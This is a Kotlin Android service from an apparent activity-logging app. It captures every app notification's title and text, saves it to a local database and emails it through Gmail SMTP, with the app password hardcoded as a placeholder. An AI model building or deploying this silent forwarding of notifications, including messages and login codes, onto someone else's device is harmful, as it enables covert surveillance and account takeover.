package com.jidenna.activitylog.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.jidenna.activitylog.data.ActivityEntry
import com.jidenna.activitylog.data.AppDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.Properties
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage

class NotifCaptureService : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO)

    // Replace these two with your own Gmail address and the 16-character app password you generated.
    private val gmailAddress = "yourname@gmail.com"
    private val gmailAppPassword = "xxxxxxxxxxxxxxxx"

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString().orEmpty()
        val text = extras.getCharSequence("android.text")?.toString().orEmpty()
        if (title.isBlank() && text.isBlank()) return

        val content = listOf(title, text).filter { it.isNotBlank() }.joinToString(": ")

        scope.launch {
            AppDatabase.get(applicationContext).activityDao().insert(
                ActivityEntry(
                    type = "notification",
                    source = sbn.packageName,
                    content = content,
                    timestamp = System.currentTimeMillis()
                )
            )
            sendEmail(
                subject = "Notification from ${sbn.packageName}",
                body = content
            )
        }
    }

    private fun sendEmail(subject: String, body: String) {
        try {
            val props = Properties().apply {
                put("mail.smtp.auth", "true")
                put("mail.smtp.starttls.enable", "true")
                put("mail.smtp.host", "smtp.gmail.com")
                put("mail.smtp.port", "587")
            }

            val session = Session.getInstance(props, object : Authenticator() {
                override fun getPasswordAuthentication(): PasswordAuthentication {
                    return PasswordAuthentication(gmailAddress, gmailAppPassword)
                }
            })

            val message = MimeMessage(session).apply {
                setFrom(InternetAddress(gmailAddress))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(gmailAddress))
                setSubject(subject)
                setText(body)
            }

            Transport.send(message)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
